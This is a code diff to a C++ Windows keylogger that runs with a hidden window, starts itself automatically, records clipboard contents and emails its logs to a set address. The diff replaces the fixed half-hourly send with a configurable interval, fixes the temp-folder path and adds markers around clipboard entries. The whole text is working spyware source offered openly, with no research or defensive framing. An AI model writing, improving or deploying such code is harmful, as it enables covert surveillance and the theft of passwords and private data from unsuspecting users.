@@ -21,6 +21,7 @@ const string EmailTo = "example@gmail.com";
 const bool IsWindowHidden = true;
 const bool LogClipboard = true;
 const bool RemoveLogsAfterSend = true; //It will remove Logs ONLY when sending log will be sucessfully
+const float FrequencyOfSendingLogs = 30; //In Minutes
 
 
 int send() {
@@ -41,7 +42,7 @@ string GetDirectory() {
 	char letter[UNLEN + 1];
 	GetSystemDirectory(letter, sizeof(letter));
 
-	cmd3 += letter[0];
+	cmd3 = letter[0];
 	cmd3 += ":\\Users\\" + (string)username + "\\AppData\\Local\\Temp\\";
 
 	return cmd3;
@@ -133,7 +134,7 @@ HANDLE clip = 0;
 char* buff;
 string buffstr = "";
 void ClipBoard() {
-
+	   
 		OpenClipboard(NULL);
 
 		if (IsClipboardFormatAvailable(CF_TEXT))
@@ -149,8 +150,9 @@ void ClipBoard() {
 		if (buff != buffstr) {
 			cout << buff<<endl;
 			buffstr = buff;
-			LOG(" #CLIPBOARD# ");
+			LOG(" #CLIPBOARD#> ");
 			LOG(buffstr);
+			LOG(" <#CLIPBOARD# ");
 		}
 }
 
@@ -166,10 +168,9 @@ int main()
 
 	autostart();
 
-	string minutes;
-	int minutesInt;
 	char KEY = 'x';
 	bool IsOnlyOneTime = true;
+
 	time_t t;
 	struct tm* tt;
 	time(&t);
@@ -181,31 +182,25 @@ int main()
 		LogFile.close();
 		send();
 
-	while (true) {
+		time_t one=clock();
 		
-		time(&t);
-		tt = localtime(&t);
-		minutes = asctime(tt)[14];
-		minutes += asctime(tt)[15];
-		minutesInt = atoi(minutes.c_str());
+	 while (true) {
+		 time_t two = clock();
+		 double time1 = (double)(two - one) / CLOCKS_PER_SEC;
+		 if (time1 / 60 >= FrequencyOfSendingLogs)
+		 {
+			 one = clock();
+			 time(&t);
+			 tt = localtime(&t);
+			 LogFile.open(LogFileName, fstream::app);
+			 LogFile << endl << "#|#" << asctime(tt);
+			 LogFile.close();
 
-		//saving and sending data every half an hour
-		if ((minutesInt == 00) && (IsOnlyOneTime == true) || (minutesInt == 30) && (IsOnlyOneTime == true))
-		{
-			LogFile.open(LogFileName, fstream::app);
-			LogFile << endl << "#|#" << asctime(tt);
-			LogFile.close();
-			int info = send();
+			 int info = send();
+			 if (RemoveLogsAfterSend && info == 0)
+				 remove(LogFileName.c_str());
+		 }
 
-			if(RemoveLogsAfterSend && info == 0)
-			remove(LogFileName.c_str());
-			IsOnlyOneTime = false;
-		}
-		//To do upper code only one time
-		if ((minutesInt != 00) && (minutesInt != 30))
-		{
-			IsOnlyOneTime = true;
-		}
 		//Log Clipboard
 		if (LogClipboard) ClipBoard();
 		Sleep(10);
